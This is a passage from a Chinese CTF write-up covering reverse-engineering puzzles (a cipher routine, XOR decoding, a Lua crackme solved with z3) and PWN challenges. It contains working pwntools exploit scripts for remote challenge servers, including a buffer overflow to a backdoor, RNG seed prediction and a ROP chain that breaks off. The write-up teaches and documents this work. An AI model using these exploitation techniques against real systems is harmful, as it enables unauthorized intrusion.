class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>);</span><br><span class="line">        quarterRound(iArr, <span class="number">1</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">12</span>);</span><br><span class="line">        quarterRound(iArr, <span class="number">2</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">13</span>);</span><br><span class="line">        quarterRound(iArr, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">14</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">quarterRound</span><span class="params">(<span class="type">int</span>[] iArr, <span class="type">int</span> i, <span class="type">int</span> i2, <span class="type">int</span> i3, <span class="type">int</span> i4)</span> &#123;</span><br><span class="line">        iArr[i] = iArr[i] + iArr[i2];</span><br><span class="line">        iArr[i4] = rotateLeft(iArr[i4] ^ iArr[i], <span class="number">16</span>);</span><br><span class="line">        iArr[i3] = iArr[i3] + iArr[i4];</span><br><span class="line">        iArr[i2] = rotateLeft(iArr[i2] ^ iArr[i3], <span class="number">12</span>);</span><br><span class="line">        iArr[i] = iArr[i] + iArr[i2];</span><br><span class="line">        iArr[i4] = rotateLeft(iArr[i4] ^ iArr[i], <span class="number">8</span>);</span><br><span class="line">        iArr[i3] = iArr[i3] + iArr[i4];</span><br><span class="line">        iArr[i2] = rotateLeft(iArr[i2] ^ iArr[i3], <span class="number">7</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">rotateLeft</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> i2)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (i &lt;&lt; i2) | (i &gt;&gt;&gt; (<span class="number">32</span> - i2));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">bytesToIntLittleEndian</span><span class="params">(<span class="type">byte</span>[] bArr, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ((bArr[i + <span class="number">3</span>] &amp; <span class="number">255</span>) &lt;&lt; <span class="number">24</span>) | ((bArr[i + <span class="number">2</span>] &amp; <span class="number">255</span>) &lt;&lt; <span class="number">16</span>) | ((bArr[i + <span class="number">1</span>] &amp; <span class="number">255</span>) &lt;&lt; <span class="number">8</span>) | (bArr[i] &amp; <span class="number">255</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">intToBytesLittleEndian</span><span class="params">(<span class="type">int</span> i, <span class="type">byte</span>[] bArr, <span class="type">int</span> i2)</span> &#123;</span><br><span class="line">        bArr[i2] = (<span class="type">byte</span>) (i &amp; <span class="number">255</span>);</span><br><span class="line">        bArr[i2 + <span class="number">1</span>] = (<span class="type">byte</span>) ((i &gt;&gt;&gt; <span class="number">8</span>) &amp; <span class="number">255</span>);</span><br><span class="line">        bArr[i2 + <span class="number">2</span>] = (<span class="type">byte</span>) ((i &gt;&gt;&gt; <span class="number">16</span>) &amp; <span class="number">255</span>);</span><br><span class="line">        bArr[i2 + <span class="number">3</span>] = (<span class="type">byte</span>) ((i &gt;&gt;&gt; <span class="number">24</span>) &amp; <span class="number">255</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] hexStringToBytes(String str) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> str.length();</span><br><span class="line">        <span class="type">byte</span>[] bArr = <span class="keyword">new</span> <span class="title class_">byte</span>[length / <span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; i += <span class="number">2</span>) &#123;</span><br><span class="line">            bArr[i / <span class="number">2</span>] = (<span class="type">byte</span>) ((Character.digit(str.charAt(i), <span class="number">16</span>) &lt;&lt; <span class="number">4</span>) + Character.digit(str.charAt(i + <span class="number">1</span>), <span class="number">16</span>));</span><br><span class="line">            System.out.print(bArr[i / <span class="number">2</span>] + <span class="string">&quot;,&quot;</span>); ##这里是添加的</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bArr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">bytesToHexString</span><span class="params">(<span class="type">byte</span>[] bArr)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> bArr.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            sb.append(String.format(<span class="string">&quot;%02x&quot;</span>, Byte.valueOf(bArr[i])));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">key = [-<span class="number">50</span>, <span class="number">67</span>, <span class="number">40</span>, <span class="number">58</span>, -<span class="number">9</span>, <span class="number">61</span>, <span class="number">16</span>, <span class="number">104</span>, <span class="number">21</span>, -<span class="number">2</span>, <span class="number">82</span>, -<span class="number">109</span>, -<span class="number">76</span>, <span class="number">116</span>, -<span class="number">11</span>, <span class="number">48</span>, -<span class="number">99</span>, <span class="number">68</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">127</span>, -<span class="number">34</span>, <span class="number">25</span>, <span class="number">83</span>, <span class="number">51</span>, <span class="number">0</span>,</span><br><span class="line">       -<span class="number">58</span>, <span class="number">6</span>, <span class="number">3</span>, -<span class="number">33</span>, -<span class="number">27</span>, <span class="number">40</span>, -<span class="number">47</span>, -<span class="number">102</span>, -<span class="number">18</span>, <span class="number">47</span>, <span class="number">109</span>, -<span class="number">74</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">30</span>, <span class="number">69</span>, ]</span><br><span class="line">enc = [-<span class="number">88</span>,<span class="number">47</span>,<span class="number">73</span>,<span class="number">93</span>,-<span class="number">116</span>,<span class="number">11</span>,<span class="number">35</span>,<span class="number">81</span>,<span class="number">32</span>,-<span class="number">53</span>,<span class="number">107</span>,-<span class="number">95</span>,-<span class="number">125</span>,<span class="number">89</span>,-<span class="number">64</span>,<span class="number">81</span>,-<span class="number">81</span>,<span class="number">115</span>,<span class="number">43</span>,<span class="number">8</span>,<span class="number">74</span>,-<span class="number">22</span>,<span class="number">122</span>,<span class="number">126</span>,<span class="number">80</span>,<span class="number">100</span>,-<span class="number">91</span>,<span class="number">49</span>,<span class="number">46</span>,-<span class="number">24</span>,-<span class="number">121</span>,<span class="number">31</span>,-<span class="number">78</span>,-<span class="number">7</span>,-<span class="number">41</span>,<span class="number">31</span>,<span class="number">95</span>,-<span class="number">122</span>,<span class="number">115</span>,<span class="number">45</span>,<span class="number">40</span>,<span class="number">56</span>,<span class="number">81</span>,<span class="number">26</span>,-<span class="number">10</span>,-<span class="number">25</span>,<span class="number">105</span>,-<span class="number">36</span>,-<span class="number">21</span>,<span class="number">59</span>,<span class="number">122</span>,-<span class="number">97</span>,-<span class="number">89</span>,-<span class="number">102</span>,<span class="number">81</span>,-<span class="number">116</span>,<span class="number">52</span>,-<span class="number">61</span>,-<span class="number">106</span>,<span class="number">85</span>,-<span class="number">81</span>,-<span class="number">54</span>,-<span class="number">123</span>,<span class="number">119</span>,</span><br><span class="line">-<span class="number">32</span>,<span class="number">32</span>,<span class="number">105</span>,-<span class="number">37</span>,-<span class="number">117</span>,<span class="number">6</span>,-<span class="number">128</span>,<span class="number">89</span>,<span class="number">2</span>,-<span class="number">4</span>,-<span class="number">21</span>,-<span class="number">118</span>,-<span class="number">94</span>,-<span class="number">81</span>,<span class="number">103</span>,<span class="number">26</span>,<span class="number">21</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">    tmp = key[i] ^ enc[i]</span><br><span class="line">    <span class="keyword">if</span> tmp &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(-tmp), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(tmp), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="WEEK3-crackme"><a href="#WEEK3-crackme" class="headerlink" title="[WEEK3]crackme"></a>[WEEK3]crackme</h3><p><a target="_blank" rel="noopener" href="https://www.luatool.cn/index.php">Lua 工具箱 (luatool.cn)</a></p>
<p>PE提示这是个lua代码，那么我们去在线网站直接解密一下</p>
<p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231105141117807.png" alt="image-20231105141117807"></p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;please input your flag:&quot;</span>)</span><br><span class="line">flag = <span class="built_in">io</span>.<span class="built_in">read</span>()</span><br><span class="line">code = &#123;&#125;</span><br><span class="line">secret = &#123;</span><br><span class="line">    <span class="number">54</span>, <span class="number">57</span>, <span class="number">566</span>, <span class="number">532</span>, <span class="number">1014</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">508</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">498</span>, <span class="number">494</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">489</span>, <span class="number">492</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">490</span>, <span class="number">498</span>, <span class="number">517</span>, <span class="number">539</span>, <span class="number">21</span>, <span class="number">528</span>, <span class="number">517</span>, <span class="number">530</span>, <span class="number">543</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">51</span>, <span class="number">562</span>, <span class="number">518</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">516</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">572</span>, <span class="number">2</span>, <span class="number">515</span>, <span class="number">60</span>, <span class="number">63</span>, <span class="number">62</span>, <span class="number">570</span>, <span class="number">553</span>, <span class="number">31</span>, <span class="number">1</span>, <span class="number">594</span>, <span class="number">117</span>, <span class="number">15</span></span><br><span class="line">&#125;</span><br><span class="line">l = <span class="built_in">string</span>.<span class="built_in">len</span>(flag)</span><br><span class="line"><span class="keyword">for</span> i = <span class="number">1</span>, l <span class="keyword">do</span></span><br><span class="line">  num = ((<span class="built_in">string</span>.<span class="built_in">byte</span>(flag, i) + i) % <span class="number">333</span> + <span class="number">444</span>) % <span class="number">555</span> - <span class="number">1</span></span><br><span class="line">  <span class="built_in">table</span>.<span class="built_in">insert</span>(code, num)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> i = <span class="number">1</span>, l <span class="keyword">do</span></span><br><span class="line">  x = i - <span class="number">1</span></span><br><span class="line">  <span class="keyword">if</span> i + <span class="number">2</span> &gt;= l <span class="keyword">then</span></span><br><span class="line">    code[i] = code[i % l + <span class="number">1</span>] ~ code[(i + <span class="number">1</span>) % l + <span class="number">1</span>]</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    code[i] = code[(i + <span class="number">1</span>) % l] ~ code[(i + <span class="number">2</span>) % l]</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> i = <span class="number">1</span>, l <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> secret[i] ~= code[i] <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Incorrect&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;You win,flag is&quot;</span>, flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>z3约束：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># z3 can&#x27;t solve problems like x%100==1(these mod value equation)</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver() 	</span><br><span class="line">secret = [<span class="number">54</span>, <span class="number">57</span>, <span class="number">566</span>, <span class="number">532</span>, <span class="number">1014</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">508</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">498</span>, <span class="number">494</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">489</span>, <span class="number">492</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">490</span>, <span class="number">498</span>, <span class="number">517</span>, <span class="number">539</span>, <span class="number">21</span>,</span><br><span class="line">          <span class="number">528</span>, <span class="number">517</span>, <span class="number">530</span>, <span class="number">543</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">51</span>, <span class="number">562</span>, <span class="number">518</span>, <span class="number">14</span>, <span class="number">527</span>, <span class="number">520</span>, <span class="number">0</span>, <span class="number">517</span>, <span class="number">57</span>, <span class="number">575</span>, <span class="number">512</span>, <span class="number">1</span>, <span class="number">572</span>, <span class="number">515</span>, <span class="number">60</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">1</span>,</span><br><span class="line">          <span class="number">594</span>, <span class="number">117</span>, <span class="number">15</span>]</span><br><span class="line">l = <span class="built_in">len</span>(secret)</span><br><span class="line">flag = [BitVec(<span class="string">&#x27;%d&#x27;</span> % i, <span class="number">12</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l)]</span><br><span class="line">code = flag[:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">52</span>):</span><br><span class="line">    code[i] = code[i + <span class="number">1</span>] ^ code[i + <span class="number">2</span>]</span><br><span class="line">code[<span class="number">52</span>] = code[<span class="number">53</span>] ^ code[<span class="number">0</span>]</span><br><span class="line">code[<span class="number">53</span>] = code[<span class="number">0</span>] ^ code[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    s.add(secret[i] == code[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> ((x + b) % <span class="number">333</span> + <span class="number">444</span>) % <span class="number">555</span> - <span class="number">1</span> == a:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(crack(m[flag[i]], i + <span class="number">1</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l)]))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在这段代码中,m是Solver生成的一个模型,用于保存求解结果。</p>
<p>flag是一个由BitVec组成的列表,表示未知变量。</p>
<p>m[1]表示取模型m中键为1的值,但是m中没有键为整数1,所以会报错。</p>
<p>m[flag[1]]表示取models中键为flag[1]的值,相当于取键为flag列表中第二个元素的值。</p>
<p>flag列表在代码中初始化为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line"></span><br><span class="line">Copy code</span><br><span class="line"></span><br><span class="line">flag = [BitVec(&#x27;[*]%d&#x27; % i , 12) for i in range(len)]</span><br></pre></td></tr></table></figure>

<p>所以flag[1]对应的是BitVec(‘[*]1’, 12),也就是第二个未知变量。</p>
<p>模型m中确实有这个键,所以可以正确打印出键为flag[1]的值。</p>
<p>总结一下:</p>
<p>m[1]: 错误访问,模型m没有整数键1</p>
<p>m[flag[1]]: 正确访问,取出模型中的第二个未知变量</p>
<p>所以两者输出不同,一个报错一个可以正确打印值。</p>
<p>区别在于m[flag[1]]通过flag列表 indirect 访问了模型的一个键,而m[1]直接以整数1为键访问,该键并不存在。</p>
</blockquote>
<h3 id="喵？喵。喵！"><a href="#喵？喵。喵！" class="headerlink" title="喵？喵。喵！"></a>喵？喵。喵！</h3><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h3 id="WEEK1-nc"><a href="#WEEK1-nc" class="headerlink" title="[WEEK1]nc"></a>[WEEK1]nc</h3><p>直接连上cat flag</p>
<h3 id="WEEK1-四则计算器"><a href="#WEEK1-四则计算器" class="headerlink" title="[WEEK1] 四则计算器"></a>[WEEK1] 四则计算器</h3><p>strlen遇到&#x2F;x00，停止读取来溢出，跳过长度判断</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./ret2text&#x27;)</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./ret2text&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">32774</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">backdoor = p64(<span class="number">0x4015E1</span>)</span><br><span class="line"></span><br><span class="line">pad = <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x32</span>+<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload = pad + backdoor</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h3 id="WEEK1-口算题"><a href="#WEEK1-口算题" class="headerlink" title="[WEEK1]口算题"></a>[WEEK1]口算题</h3><p>交互题目，但是其中包含了两unicode字符，我们修改一下将其解码成utf-8编码就好了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">30687</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;start...&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    p.recvline()</span><br><span class="line">    a = p.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    a = a[<span class="number">0</span>:-<span class="number">3</span>]</span><br><span class="line">    a = a.replace(<span class="string">&#x27;÷&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    a = a.replace(<span class="string">&#x27;×&#x27;</span>, <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    r = <span class="built_in">eval</span>(a)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(r))</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="WEEK1-猜数游戏"><a href="#WEEK1-猜数游戏" class="headerlink" title="[WEEK1]猜数游戏"></a>[WEEK1]猜数游戏</h3><p>经典猜数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *   </span><br><span class="line">dll = cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">ip, port = <span class="string">&#x27;112.6.51.212:32778&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p = remote(ip ,port)</span><br><span class="line"></span><br><span class="line">a = dll.srand(dll.time(<span class="number">0</span>))</span><br><span class="line">b=dll.rand()</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil(b&#x27;number?&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;number?&#x27;</span>,<span class="string">b&#x27;11&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(b))</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="WEEK1-hard-nc"><a href="#WEEK1-hard-nc" class="headerlink" title="[WEEK1]hard nc"></a>[WEEK1]hard nc</h3><p>gift2里有个base64,解密即可</p>
<blockquote>
<p>MWYtOTdlNi0wMzBiNTNlNjdkODN9Cg&#x3D;&#x3D;</p>
</blockquote>
<p>ls -a，可以看到隐藏的文件，然后直接</p>
<blockquote>
<p>cd .gift    ##别忘了(.)</p>
</blockquote>
<h3 id="WEEK1-ropchain"><a href="#WEEK1-ropchain" class="headerlink" title="[WEEK1]ropchain"></a>[WEEK1]ropchain</h3><p>题目就已知是使用ROPgadget做了，那我们能干什么，直接顺从</p>
<blockquote>
<p>ROPgadget –binary 文件名 –ropchain</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;chal&#x27;)</span></span><br><span class="line">pl=remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">32783</span>)</span><br><span class="line"><span class="comment"># p=gdb.debug(&#x27;./chal&#x27;)</span></span><br><span class="line"><span class="comment"># p=remote(&quot;node3.buuoj.cn&quot;,28477)</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./wustctf2020_name_your_cat&#x27;)</span></span><br><span class="line"><span class="comment"># elf=ELF(&#x27;./wustctf2020_name_your_cat&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a30d</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 